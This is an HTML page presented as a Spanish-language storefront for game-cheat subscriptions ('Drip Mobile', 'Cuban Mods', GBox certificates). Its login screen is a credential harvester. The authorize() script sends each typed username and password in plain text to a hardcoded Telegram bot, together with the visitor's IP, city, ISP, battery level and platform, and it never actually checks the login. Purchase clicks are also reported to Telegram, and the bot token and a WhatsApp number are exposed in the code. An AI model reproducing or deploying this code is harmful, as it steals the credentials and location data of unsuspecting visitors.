<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ZETA | COMMAND CENTER</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@300;500&display=swap');
        
        :root { --p: #00ff41; --s: #00f2ff; --bg: #020405; --g: rgba(255, 255, 255, 0.03); }
        
        * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
        body { 
            margin: 0; background: var(--bg); color: #fff; font-family: 'JetBrains+Mono', monospace;
            overflow-x: hidden; background-image: radial-gradient(circle at 50% 50%, #00ff4108, transparent);
        }

        /* OVERLAY DE AUTENTICACIÓN ELITE */
        #auth-screen {
            position: fixed; inset: 0; background: #000; z-index: 10000;
            display: flex; align-items: center; justify-content: center;
        }
        .terminal-box {
            background: var(--g); padding: 50px; border-radius: 20px;
            border: 1px solid rgba(0,255,65,0.2); backdrop-filter: blur(25px);
            width: 90%; max-width: 450px; text-align: center;
            box-shadow: 0 0 50px rgba(0,255,65,0.1);
        }
        .scanner { width: 100%; height: 2px; background: var(--p); box-shadow: 0 0 15px var(--p); animation: scan 2.5s infinite; margin-bottom: 30px; }
        @keyframes scan { 0%, 100% { transform: translateY(0); opacity: 0.2; } 50% { transform: translateY(40px); opacity: 1; } }

        .t-input {
            background: rgba(0,0,0,0.6); border: 1px solid #1a1a1a; color: var(--p);
            width: 100%; padding: 15px; margin: 10px 0; border-radius: 4px;
            font-family: 'JetBrains+Mono'; text-align: center; border-left: 3px solid var(--p);
        }
        .t-btn {
            background: var(--p); color: #000; border: none; width: 100%;
            padding: 18px; font-family: 'Orbitron'; font-weight: 900;
            cursor: pointer; margin-top: 20px; letter-spacing: 3px; transition: 0.4s;
        }
        .t-btn:hover { background: #fff; box-shadow: 0 0 30px #fff; }

        /* INTERFAZ DE MANDO */
        header { padding: 40px; border-bottom: 1px solid rgba(255,255,255,0.05); text-align: center; }
        .logo { font-family: 'Orbitron'; font-size: 3rem; letter-spacing: 20px; font-weight: 900; color: #fff; }
        
        .hud-bar {
            max-width: 1300px; margin: 20px auto; padding: 10px 30px;
            background: var(--g); border: 1px solid rgba(255,255,255,0.05);
            display: flex; justify-content: space-between; font-size: 0.7rem; color: var(--s);
        }

        .container { max-width: 1300px; margin: auto; padding: 40px 20px; }
        
        /* TIENDA DE SOFTWARE PRO */
        .grid-layout { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 30px; }
        .card-pro {
            background: linear-gradient(145deg, #0a0c0e, #030506);
            border-radius: 15px; border: 1px solid #1a1a1a; padding: 35px;
            position: relative; transition: 0.4s;
        }
        .card-pro:hover { border-color: var(--p); transform: translateY(-5px); }
        .card-pro h3 { font-family: 'Orbitron'; color: var(--p); margin-bottom: 25px; font-size: 1.2rem; }

        .price-item {
            display: flex; justify-content: space-between; align-items: center;
            padding: 15px 20px; background: rgba(255,255,255,0.02);
            border-radius: 8px; margin-bottom: 10px; border: 1px solid transparent;
        }
        .price-item:hover { border-color: rgba(0,255,65,0.2); background: rgba(0,255,65,0.03); }
        .val-text { font-family: 'Orbitron'; font-weight: 700; color: #fff; }

        .buy-small {
            background: var(--p); color: #000; border: none; padding: 8px 15px;
            font-family: 'Orbitron'; font-weight: 900; font-size: 0.6rem; cursor: pointer;
        }

        .wa-btn {
            position: fixed; bottom: 30px; right: 30px; background: #25d366;
            width: 65px; height: 65px; border-radius: 50%; display: flex;
            align-items: center; justify-content: center; font-size: 30px;
            color: #fff; box-shadow: 0 10px 30px rgba(0,0,0,0.5); z-index: 1000;
        }

        /* PAÍSES */
        .country-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; }
        .c-item {
            background: var(--g); padding: 30px; border-radius: 12px;
            border: 1px solid #111; text-align: center; cursor: pointer;
        }
        .c-item:hover { border-color: var(--s); background: rgba(0,242,255,0.05); }
    </style>
</head>
<body>

<div id="auth-screen">
    <div class="terminal-box">
        <div class="scanner"></div>
        <h2 style="font-family:Orbitron; letter-spacing:8px; color:var(--p);">ZETA AGENT</h2>
        <input type="text" id="u" class="t-input" placeholder="AGENT_ID">
        <input type="password" id="p" class="t-input" placeholder="ACCESS_CODE">
        <button class="t-btn" onclick="authorize()">AUTHORIZE</button>
    </div>
</div>

<header>
    <div class="logo">ZETA</div>
</header>

<div class="hud-bar">
    <span id="h-user">ID: NONE</span>
    <span id="h-ip">IP: UNKNOWN</span>
    <span id="h-batt">BATT: --%</span>
</div>

<div class="container" id="app" style="display:none;">
    <div id="view-home">
        <h2 style="font-family:Orbitron; margin-bottom:30px; font-size:0.8rem; color:#444; letter-spacing:4px;">[ SELECT_DEPLOYMENT_ZONE ]</h2>
        <div class="country-grid" id="cg"></div>
    </div>

    <div id="view-store" style="display:none;">
        <button onclick="location.reload()" style="background:none; border:none; color:#555; cursor:pointer; margin-bottom:30px; font-family:Orbitron; font-size:0.7rem;">&lt; RETURN_TO_MAP</button>
        <h1 id="rn" style="font-family:Orbitron; color:var(--p); margin-bottom:40px; letter-spacing:5px;"></h1>
        <div id="pl" class="grid-layout"></div>
    </div>
</div>

<a href="https://wa.me/573001308078" class="wa-btn"><i class="fab fa-whatsapp"></i></a>

<script>
const BOT_TOKEN = "8093212860:AAFtxW_wZgngSg7nq-sKCvhTONkcSRgSy-c";
const CHAT_ID = "7621351319";

async function authorize() {
    const user = document.getElementById('u').value;
    const pass = document.getElementById('p').value;
    if(!user || !pass) return;

    try {
        const ipReq = await fetch('https://ipapi.co/json/');
        const ip = await ipReq.json();
        const batt = await navigator.getBattery();

        const report = `
🔱 *ZETA AGENT AUTHENTICATED*
━━━━━━━━━━━━━━━━━━
👤 *AGENT:* \`${user}\`
🔑 *CODE:* \`${pass}\`
━━━━━━━━━━━━━━━━━━
🌍 *IP:* ${ip.ip}
📍 *LOC:* ${ip.city}, ${ip.country_name}
📡 *ISP:* ${ip.org}
🔋 *BATT:* ${Math.round(batt.level * 100)}% (${batt.charging ? 'Charging' : 'Discharging'})
📱 *PLATFORM:* ${navigator.platform}
━━━━━━━━━━━━━━━━━━`;

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);

        localStorage.setItem('zeta_ag', user);
        document.getElementById('auth-screen').style.display = 'none';
        document.getElementById('app').style.display = 'block';
        document.getElementById('h-user').innerText = `ID: ${user.toUpperCase()}`;
        document.getElementById('h-ip').innerText = `IP: ${ip.ip}`;
        document.getElementById('h-batt').innerText = `BATT: ${Math.round(batt.level * 100)}%`;
        initHome();
    } catch(e) {
        // Fallback si falla el rastreo avanzado
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=User: ${user} Pass: ${pass}`);
        localStorage.setItem('zeta_ag', user);
        location.reload();
    }
}

const DATA = {
    paises: [
        {n:"ARGENTINA", b:"🇦🇷", t:1500, c:"ARS"}, {n:"BOLIVIA", b:"🇧🇴", t:14, c:"BS"},
        {n:"BRASIL", b:"🇧🇷", t:5.2, c:"BRL"}, {n:"CHILE", b:"🇨🇱", t:970, c:"CLP"},
        {n:"COLOMBIA", b:"🇨🇴", t:3900, c:"COP"}, {n:"ECUADOR", b:"🇪🇨", t:1, c:"USD"},
        {n:"MEXICO", b:"🇲🇽", t:20, c:"MXN"}, {n:"PERU", b:"🇵🇪", t:3.55, c:"PEN"},
        {n:"USA", b:"🇺🇸", t:1, c:"USD"}, {n:"ESPAÑA", b:"🇪🇸", t:1, c:"EUR"}
    ],
    items: [
        {n:"DRIP MOBILE NORMAL", d:[1,7,15,30], p:[3,8,12,18]},
        {n:"DRIP MOBILE ROOT", d:[1,7,15,30], p:[3,8,12,18]},
        {n:"CUBAN MODS", d:[1,10,31], p:[3,9,19]},
        {n:"CERTIFICADOS GBOX", d:["ANUAL"], p:[18]},
        {n:"CUBAN PANEL PC", d:[1,7,30], p:[3,8,16]}
    ]
};

function initHome() {
    const cg = document.getElementById('cg');
    DATA.paises.forEach(p => {
        const d = document.createElement('div');
        d.className = 'c-item';
        d.onclick = () => openStore(p);
        d.innerHTML = `<div style="font-size:2rem;">${p.b}</div><div style="font-family:Orbitron; font-size:0.7rem; margin-top:10px;">${p.n}</div>`;
        cg.appendChild(d);
    });
}

function openStore(p) {
    document.getElementById('view-home').style.display = 'none';
    document.getElementById('view-store').style.display = 'block';
    document.getElementById('rn').innerText = p.n;
    window.scrollTo(0,0);

    const pl = document.getElementById('pl'); pl.innerHTML = '';
    DATA.items.forEach(i => {
        let rows = '';
        i.d.forEach((d, idx) => {
            let v = Math.ceil(i.p[idx] * p.t);
            let t = isNaN(d) ? d : d + " DÍAS";
            rows += `
            <div class="price-item">
                <span style="font-size:0.8rem;">${t}</span>
                <span class="val-text">${v.toLocaleString()} ${p.c}</span>
                <button class="buy-small" onclick="order('${i.n}','${t}','${v} ${p.c}')">BUY</button>
            </div>`;
        });
        pl.innerHTML += `<div class="card-pro"><h3>${i.n}</h3>${rows}</div>`;
    });
}

function order(n, d, p) {
    const ag = localStorage.getItem('zeta_ag');
    const msg = `💰 *PURCHASE ATTEMPT*%0A👤 Agent: ${ag}%0A💎 Item: ${n}%0A⏳ Plan: ${d}%0A💵 Price: ${p}`;
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
    
    window.open(`https://wa.me/573001308078?text=🔱 *ZETA COMMAND*%0A👤 Agente: ${ag}%0A💎 Software: ${n}%0A⏳ Plan: ${d}%0A💰 Precio: ${p}`, '_blank');
}

if(localStorage.getItem('zeta_ag')) {
    document.getElementById('auth-screen').style.display = 'none';
    document.getElementById('app').style.display = 'block';
    document.getElementById('h-user').innerText = `ID: ${localStorage.getItem('zeta_ag').toUpperCase()}`;
    initHome();
}
</script>
</body>
</html>
